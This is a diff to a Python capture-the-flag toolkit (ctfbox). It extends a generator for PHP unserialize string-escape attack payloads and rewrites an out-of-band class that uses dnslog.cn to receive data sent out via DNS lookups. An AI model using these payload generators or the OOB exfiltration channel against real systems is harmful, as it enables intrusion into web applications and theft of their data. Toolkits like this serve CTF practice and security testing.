@@ -1,5 +1,7 @@
+from ctfbox.utils.utils import md5
 import os
 import sqlite3
+from uuid import uuid4
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from enum import Enum
 from functools import partial
@@ -12,18 +14,17 @@ from itertools import chain
 from json import loads
 from math import ceil
 from os import path
-from queue import Queue
+from queue import Queue, Empty
 from re import match, sub, IGNORECASE
 from socket import AF_INET, SO_REUSEADDR, SOCK_STREAM, SOL_SOCKET, socket
 from tempfile import NamedTemporaryFile
 from threading import Lock, Thread
-from time import time
-from typing import Dict, List, Tuple, Union
+from time import time, sleep
+from typing import Dict, List, Tuple, Union, Optional
 from urllib.parse import quote, quote_plus, urljoin, urlparse
 from zlib import decompress as zlib_decompress
 
 import requests
-import socketio
 from ctfbox.exceptions import (DumpError, SvnParseError, DSStoreParseError,
                                FlaskSessionHelperError,
                                GeneratePayloadError, HashAuthArgumentError,
@@ -139,13 +140,28 @@ def _parse_form_data(body):
     return parse_dict
 
 
-def _generateTrash(diff_len: int, remain: int):
+def _generateTrashWithValue(diff_len: int, remain: int):
     pure_string_len = 12
     k = ceil((remain + pure_string_len) / diff_len)
     filed_len = k * diff_len - 12 - remain
-    result = ""
+    if filed_len == 0:
+        k += 1
+        filed_len = diff_len
     result = '''s:2:"_%s";i:%d;''' % (
         random_string(1), 10 ** (filed_len - 1))
+    return k, result
+
+
+def _generateTrashWithoutValue(diff_len: int, remain: int):
+    pure_string_len = 7
+    k = ceil((remain + pure_string_len) / diff_len)
+    filled_len = k * diff_len - 7 - remain
+    if filled_len == 0:
+        k += 1
+        filled_len = diff_len
+    num_len = filled_len
+    filled_len -= len(str(num_len))
+    result = '''s:%d:"_%s";''' % (num_len, random_string(filled_len))
     return k, result
 
 
@@ -572,7 +588,7 @@ def gopherraw(raw: str, host: str = "", ssrfFlag: bool = True) -> str:
     return header + data
 
 
-def php_serialize_escape(src: str, dst: str, payload: str, paddingTrush: bool = False) -> dict:
+def php_serialize_escape(src: str, dst: str, payload: str, paddingTrush: bool = False, newObject: bool = True) -> dict:
     """Use for generate php unserialize escape attack payload, will decide to call l2s or s2l according to the length of src and dst
 
     Args:
@@ -580,6 +596,7 @@ def php_serialize_escape(src: str, dst: str, payload: str, paddingTrush: bool = 
         dst (str): replace string, this length cannot be the same as src
         payload (str):  the php serialize data you want to insert
         paddingTrush (bool, optional): only for payload length error, it will try to padding trush in payload. Defaults to False.
+        newObject (bool, optional): set to true when you want to insert a new object. Only work for short to long mode. Defaults to False.
 
     Returns:
         s2l:
@@ -601,15 +618,15 @@ def php_serialize_escape(src: str, dst: str, payload: str, paddingTrush: bool = 
     """
     diff_len = len(dst) - len(src)
     if diff_len > 0:
-        return php_serialize_escape_s2l(src, dst, payload, paddingTrush)
+        return php_serialize_escape_s2l(src, dst, payload, paddingTrush, newObject)
     elif diff_len < 0:
-        return php_serialize_escape_l2s(src, dst, payload, paddingTrush)
+        return php_serialize_escape_l2s(src, dst, payload, paddingTrush, newObject)
     else:
         raise GeneratePayloadError(
             "The length of dst cannot be the same as src")
 
 
-def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: bool = False) -> dict:
+def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: bool = False, newObject: bool = True) -> dict:
     """
     Use for generate short to long php unserialize escape attack payload
     Tips:
@@ -620,6 +637,7 @@ def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: boo
         dst (str): replace string, this length must be greater than src
         payload (str): the php serialize data you want to insert
         paddingTrush (bool, optional): only for payload length error, it will try to padding trush in payload. Defaults to False.
+        newObject (bool, optional): set to true when you want to insert a new object. Defaults to False.
 
 
     Returns:
@@ -633,15 +651,29 @@ def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: boo
     if diff_len <= 0:
         raise GeneratePayloadError("dst length must be greater than src")
 
-    padding_len, remain = divmod(len(payload) + 4, diff_len)
+    is_object = payload.startswith("O")
+    if is_object:
+        padding_len, remain = divmod(len(payload) + 3, diff_len)
+    else:
+        padding_len, remain = divmod(len(payload) + 4, diff_len)
+
     if remain != 0:
         if not paddingTrush:
             raise GeneratePayloadError(
                 "payload length error, try modify it, maybe you can put {paddingTrush=True} into the function")
-        k, trush = _generateTrash(diff_len, remain)
+        print(newObject)
+        if newObject:
+            k, trush = _generateTrashWithoutValue(diff_len, remain)
+        else:
+            k, trush = _generateTrashWithValue(diff_len, remain)
         padding_len += k
         payload = trush + payload
-    payload = '";' + payload + ";}"
+
+    if is_object:
+        payload = '";' + payload + "}"
+    else:
+        payload = '";' + payload + ";}"
+
     result = src * padding_len + payload
     result_dict = {
         'insert_data': result
@@ -649,7 +681,7 @@ def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: boo
     return result_dict
 
 
-def php_serialize_escape_l2s(src: str, dst: str, payload: str, paddingTrush: bool = False) -> dict:
+def php_serialize_escape_l2s(src: str, dst: str, payload: str, paddingTrush: bool = False, newObject: bool = True) -> dict:
     """
     Use for generate long to short php unserialize escape attack payload
 
@@ -661,6 +693,7 @@ def php_serialize_escape_l2s(src: str, dst: str, payload: str, paddingTrush: boo
         dst(str): replace string, this length must be shorter than search
         payload(str): the php serialize data you want to insert
         paddingTrush (bool, optional): only for payload length error, it will try to padding trush in payload. Defaults to False.
+        newObject (bool, optional): useless.
 
     Returns:
         dict:
@@ -863,86 +896,75 @@ class OOB():
         prepare(self, data) -> str  # prepare url which you can send with data
 
     Note:
-        power by socket.io and dnslog.io
+        power by dnslog.cn
 
     Example:
         with OOB() as oob:
-            domain = oob.domain # get domain
-            requests.get(oob.prepare("test")) # send "test" and you will receive it
-            for data in oob:
-                print(data)
-
+            domain = oob.domain  # get domain
+            requests.get(oob.prepare("test"))  # send "test" and you will receive it
+            print(oob.get_one())
     """
 
     def __init__(self, showDomain: bool = True, debug: bool = False):
-        sio = socketio.Client()
-        self.sio = sio
-        self._queue = Queue()
-        self._debug = debug
-        self._unique = []
-        self._showDomain = showDomain
-        self._updateTime = time()
-        self._domainlock = Lock()
-        self._domainlock.acquire()
-
-        @sio.on("randomDomain")
-        def randomDomain(data):
-            domain = data["domain"]
-            self._showDomain and print('DnsLog domain:', domain)
-            self.domain = domain
-            self._domainlock.release()
-
-        @sio.on("dnslog")
-        def dnslog(data):
-            current_time = time()
-            if current_time - self._updateTime > 3.0:
-                del self._unique
-                self._unique = []
-                self._updateTime = current_time
-            message = data["dnslog"]
-            message = message.split(".")[0]
-            if message not in self._unique:
-                self._unique.append(message)
-                self._queue.put(message)
-
-        @sio.event
-        def connect():
-            self._debug and print("websocket connected")
-
-        @sio.event
-        def connect_error(data):
-            self._debug and print("websocket connection failed")
-
-        @sio.event
-        def disconnect():
-            self._debug and print("websocket disconnect")
-
-        sio.connect("https://dnslog.io/")
-
-    def __iter__(self):
-        return self
-
-    def __next__(self):
-        data = self._queue.get()
-        return data
-
-    def __getattribute__(self, name):
-        if name == "domain":
-            self._domainlock.acquire()
-            domain = object.__getattribute__(self, "domain")
-            self._domainlock.release()
-            return domain
-        return object.__getattribute__(self, name)
+        self._queue = Queue(-1)
+        self._hashlist = []
+        self._cookies = {"PHPSESSID": str(uuid4())}
+        self.domain = self._get_domain()
 
     def __enter__(self):
         return self
 
     def __exit__(self, exc_type, exc_value, trace):
-        try:
-            self.sio.disconnect()
-        except Exception:
-            print("close socket.io failed")
-            return True
+        del self._queue
+
+    def _get_domain(self):
+        res = requests.get("http://dnslog.cn/getdomain.php",
+                           cookies=self._cookies)
+        return res.text.strip()
+
+    def get_one(self, no_wait=True, interval=0.5, timeout=5) -> Optional[str]:
+        """Get the latest one record.
+
+        Args:
+            no_wait (bool, optional): whether unblocking. Defaults to True.
+            interval (float, optional): interval seconds. Defaults to 0.5.
+            timeout (int, optional): timeout seconds. Defaults to 5.
+
+        Returns:
+            Optional[str]: record data
+        """
+        past_time = 0
+        while True:
+            self._get()
+            try:
+                return self._queue.get_nowait()
+            except Empty:
+                if no_wait:
+                    return None
+                else:
+                    sleep(interval)
+                    past_time += interval
+                    if past_time >= timeout:
+                        return None
+
+    def _get(self):
+        res = requests.get("http://dnslog.cn/getrecords.php",
+                           cookies=self._cookies)
+        records = '{"records":' + res.text.strip() + "}"
+        records = loads(records)["records"]
+
+        for record in records:
+            if len(record) != 3:
+                continue
+            record_hash = md5(str(record))
+            if record_hash in self._hashlist:
+                continue
+
+            self._hashlist.append(record_hash)
+            data = record[0].split(".", 1)[0]
+
+            self._queue.put(data)
+
 
     def prepare(self, data) -> str:
         """prepare url which you can send with data
